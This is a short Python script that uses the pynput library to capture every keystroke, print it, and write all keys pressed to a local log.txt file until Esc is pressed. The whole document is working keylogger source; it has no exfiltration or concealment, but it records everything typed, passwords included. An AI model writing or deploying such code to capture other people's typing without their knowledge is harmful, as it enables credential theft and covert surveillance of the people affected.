import pynput
from pynput.keyboard import Key, Listener
import os

keys = []

# Do thing when key is pressed
def on_press(key):
    keys.append(key)
    print("Pressed",key)
    write_file(keys)

def write_file(keys):
    # Detect if log.txt already exists or not, to either append or make new file
    with open("log.txt", "w" if os.path.isfile("log.txt") else "w+") as file:
        for key in keys:
            key = str(key).replace("'","")
            # If key == space, add new line etc.
            if key == "Key.space" or key == "Key.enter" or key == "Key.backspace":
                file.write("\n")
            elif key.find("Key") == -1:
                file.write(key)
            else:
                file.write("\n"+key)
        file.close()

# Do other thing when key is released
def on_release(key):
    if key == Key.esc:
        return False

# Main listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()